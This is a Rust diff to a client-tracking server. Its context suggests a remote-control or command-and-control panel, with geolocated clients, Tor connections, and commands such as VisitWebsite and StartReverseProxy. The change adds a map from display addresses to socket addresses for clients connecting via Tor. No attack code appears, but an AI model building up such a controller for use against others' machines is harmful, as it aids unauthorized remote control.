@@ -24,6 +24,10 @@ pub struct ServerWrapper {
     receiver: Receiver<ServerCommand>,
     txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>>,
     connected_users: HashMap<std::net::SocketAddr, ClientInfo>,
+    /// Maps display addr (e.g. "79.226.87.244:49707") → real socket addr
+    /// (e.g. "127.0.0.1:49707").  Needed because the frontend uses the
+    /// display addr for all commands, but internal maps are keyed by socket addr.
+    display_to_socket: HashMap<String, SocketAddr>,
     priv_key: RsaPrivateKey,
     pub_key: RsaPublicKey,
     tauri_handle: Option<Arc<Mutex<AppHandle>>>,
@@ -53,6 +57,7 @@ impl ServerWrapper {
             receiver,
             txs,
             connected_users,
+            display_to_socket: HashMap::new(),
             priv_key,
             pub_key,
             tauri_handle: None,
@@ -67,8 +72,24 @@ impl ServerWrapper {
         Ok(())
     }
 
+    /// Resolve a SocketAddr that may be a display addr (real IP) back to the
+    /// actual socket addr used as the internal key.  When a Tor client connects,
+    /// the socket addr is 127.0.0.1:port but the frontend uses the real IP.
+    fn resolve_addr(&self, addr: &SocketAddr) -> SocketAddr {
+        // If the addr is already a valid key, use it directly.
+        if self.connected_users.contains_key(addr) {
+            return *addr;
+        }
+        // Otherwise try the display→socket reverse map.
+        self.display_to_socket
+            .get(&addr.to_string())
+            .copied()
+            .unwrap_or(*addr)
+    }
+
     // Helper method for common command logging and execution
     async fn handle_command(&mut self, addr: &SocketAddr, packet: ClientboundPacket) {
+        let addr = &self.resolve_addr(addr);
         println!("Handling command: {:?}", packet.get_type());
         println!("Packet: {:?}", packet);
         if let Some(client) = self.connected_users.get(addr) {
@@ -95,6 +116,7 @@ impl ServerWrapper {
         event: &str,
         payload: serde_json::Value,
     ) {
+        let addr = &self.resolve_addr(addr);
         if let Some(client) = self.connected_users.get(addr) {
             self.log_events
                 .log(
@@ -211,6 +233,9 @@ impl ServerWrapper {
                         .unwrap_or(addr);
                     client_info.data.country_code = self.get_country_code(&geoip_addr).await;
 
+                    // Register reverse mapping so frontend commands using display_addr
+                    // can be translated back to the real socket addr for internal lookups.
+                    self.display_to_socket.insert(display_addr.clone(), addr);
                     self.connected_users.insert(addr, client_info.clone());
 
                     self.log_events
@@ -250,6 +275,8 @@ impl ServerWrapper {
                     self.txs.remove(&addr);
                     self.reverse_proxy_tasks.remove(&addr);
                     self.connected_users.remove(&addr);
+                    // Clean up reverse mapping
+                    self.display_to_socket.retain(|_, v| *v != addr);
                 }
 
                 VisitWebsite(addr, data) => {
@@ -946,7 +973,16 @@ impl ServerWrapper {
                 }
 
                 GetClient(addr, resp) => {
-                    resp.send(self.connected_users.get(&addr).cloned()).ok();
+                    // Try direct socket addr lookup first, then fall back to
+                    // reverse-mapping from display addr (for Tor clients where
+                    // the frontend uses the real IP but the key is 127.0.0.1).
+                    let result = self.connected_users.get(&addr).cloned().or_else(|| {
+                        let display = addr.to_string();
+                        self.display_to_socket
+                            .get(&display)
+                            .and_then(|sock| self.connected_users.get(sock).cloned())
+                    });
+                    resp.send(result).ok();
                 }
 
                 StartReverseProxy(addr, port, local_port) => {
